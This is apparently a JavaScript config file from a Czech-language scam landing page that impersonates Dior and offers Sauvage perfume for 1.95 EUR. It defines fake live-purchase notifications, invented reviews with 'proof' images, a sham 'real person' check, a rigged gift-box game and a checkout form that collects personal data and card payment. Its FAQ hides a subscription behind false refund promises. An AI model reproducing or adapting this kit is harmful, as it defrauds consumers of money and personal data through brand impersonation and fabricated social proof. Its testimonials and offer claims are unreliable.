const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "cz";
  const lang = "cs-CZ";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Velikost: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "Gratulujeme! <br><br> Můžete se zúčastnit propagace Dior Sauvage 100 ml!",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    text: "Dior prodává své poslední parfémy Sauvage za pouhých 1,95 € poté, co ukončil své operace ve východní Evropě. Díky nové marketingové strategii může každý Čech dnes získat jeden z 1000 parfémů 🎁.<br><br> Abyste mohli získat parfém Sauvage od Dioru, vyplňte prosím formulář a potvrďte, že jste skutečná osoba. <br><br> Pospěšte si, počet nabízených kusů je omezený!",
  };

  const notifications = [
    {
      user: "Beáta L***",
      location: "Praha, Česko",
      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
      timeago: "před 15 sekundami",
    },
    {
      user: "Tereza B***",
      location: "Brno, Česko",
      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
      timeago: "před 25 sekundami",
    },
  ];

  const reviewsArr = [
    {
      name: "Lukáš",
      time: "před 1 dnem",
      header: "To je neuvěřitelné!",
      product: "26468782",
      image: "./assets/proof1.jpg",
      review: "Nedávno jsem slyšel o této propagaci a rozhodl jsem se ji zakoupit. Děkuji Dior za prodej.",
    },
    {
      name: "Antonín",
      time: "před 2 dny",
      header: "Fantastické! Jsem beze slov.",
      product: "26468789",
      image: "./assets/proof2.jpeg",
      review: "Děkuji. Balíček byl doručen velmi rychle.",
    },
    {
      name: "Josefa",
      time: "před 2 dny",
      header: "Prostě úžasné.",
      product: "26468783",
      image: "./assets/proof3.jpg",
      review: "Můj manžel nechtěl, abych se zúčastnila, protože jsme o tomto prodeji neslyšeli, ale když dorazil můj balíček, byl velmi nadšený.",
    },
    {
      name: "Mikuláš",
      time: "před 4 dny",
      header: "Miluje ho.",
      image: "./assets/proof4.jpg",
      review: "Chtěl jsem tyto parfémy už dlouho a konečně mám jeden.",
    },
    {
      name: "Jan",
      time: "před 7 dny",
      header: "Wow, jsem naprosto nadšený z tohoto produktu!",
      product: "26468784",
      image: "./assets/proof5.jpg",
      review: "Neuvěřitelné. Drahý a kvalitní parfém za pouhých 1,95 €. Děkuji!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "KOMENTÁŘE A HODNOCENÍ",
    percent: "99%",
    rec: "Komentáře k této akci",
  };

  const questions = {
    _of: "Otázka {1} z {2}: ",
    arr: [
      {
        q: "Už jste někdy nosili Dior Sauvage?",
        a: ["Ano", "Ne"],
      },
      {
        q: "Kde jste našli tuto frázi?",
        a: ["Na oficiální webové stránce", "Reklamy na Facebooku", "Předáno přítelem"],
      },
      {
        q: "K jakému účelu použijete Dior Sauvage?",
        a: ["Na dárek", "Pro osobní použití"],
      },
    ],
  };

  const check = {
    title: "Vaše odpovědi se ověřují.",
    secondTitle: "Načítání...",
    arr: [
      "Odpověděli jste na otázku 3/3",
      "Žádné předběžné studie vaší IP.",
      "Dárky se načítají...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Gratulujeme, úspěšně jste ověřili, že jste skutečná osoba.",
        button: "OK",
        text: `
      <center>
      Dnes, {date}, máte možnost získat svůj Dior Sauvage 100ml.
        <br><br>
        Stačí si jen vybrat správný dárkový balíček.
        <br><br>
        Máte 3 možnosti, hodně štěstí!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Ach ne...",
        button: "OK",
        text: `
      <center>
      Omlouváme se, ale tento dárek je prázdný. Zbývají vám 2 pokusy. Hodně štěstí!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Gratulujeme! Vyhráli jste!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        Vyhráli jste Dior Sauvage 100ml!
        </p>
        <br>
        1) Klikněte na "OK" níže pro přechod na stránku platby za dopravu.
         <br><br>
        2) Vyplňte formulář a zaplaťte svou objednávku, abyste obdrželi Dior Sauvage.
        <br><br>
        3) Balíček bude doručen za 5 až 7 dní.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "Jak dlouho budu muset čekat na svou cenu?",
      answer: "Obvykle to trvá 5 až 7 pracovních dnů.",
    },
    {
      question: "Jsou nějaké skryté náklady?",
      answer: "Absolutně ne. Jakmile vyhrajete svou cenu a zadáte své údaje, postaráme se o zbytek. Náklady na dopravu jsou naší odpovědností!",
    },
    {
      question: "Jsem výherce, proč bych měl odpovídat na otázky/hádat krabici?",
      answer: "Ještě nejste výherce, ale byl jste jedním z 10 vybraných k pokusu získat naši cenu...",
    },
    {
      question: "Jak mohu získat cenu, pokud vyhraju?",
      answer: "Nejprve musíte zadat svou doručovací adresu a kontaktní údaje, poté vás náš systém přesměruje. Pak musíte dokázat, že nejste robot, protože cena je nabízena pouze skutečným lidem.",
    },
    {
      question: "Proč bych měl platit 1,95 € za cenu?",
      answer: "1,95 € není cena - je to předplatné, které dokazuje, že jste skutečně člověk. Všechny platby budou vráceny po schválení.",
    },
    {
      question: "Nemohu použít svou kreditní kartu, transakce selhala?",
      answer: "Pokud nemůžete použít svou kreditní kartu, vaše banka blokuje transakci: musíte ověřit svůj bankovní účet.",
    },
  ];

  const cartSteps = {
    personal: {
      title: "Osobní údaje",
      fields: {
        name: {
          enabled: true,
          field: "Jméno",
        },
        family: {
          enabled: true,
          field: "Příjmení",
        },
        phone: {
          enabled: true,
          field: "Telefonní číslo",
        },
        email: {
          enabled: true,
          field: "Email",
        },
      },
    },
    delivery: {
      title: "Doručení",
      fields: {
        city: {
          enabled: true,
          field: "Město",
        },
        address: {
          enabled: true,
          field: "Doručovací adresa",
        },
        zip: {
          enabled: true,
          field: "PSČ",
        },
      },
    },
    payment: {
      title: "Způsoby platby",
      creditCard: "Platba online kreditní kartou",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Přehled objednávky",
      oldPrice: "",
      newPrice: "1,95 €",
      size: "Velikost",
      subTotal: {
        title: "Hodnota objednávky",
        amount: "1,95 €",
      },
      delivery: {
        title: "Doručení",
        amount: "0,00 €",
      },
      total: {
        title: "Celkem",
        amount: "1,95 €",
      },
      checkoutButton: "Zaplaťte svou objednávku",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Dior Sauvage 100ml",
      miniImg: "./assets/slide_1.png",

      images: [
        "./assets/slide_1.png",
        "./assets/slide_2.png",
        "./assets/slide_3.jpg",
        "./assets/slide_4.jpg",
      ],
    },
  ];




  const footer = {
    cr: "© 2024 DIOR. All rights reserved.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
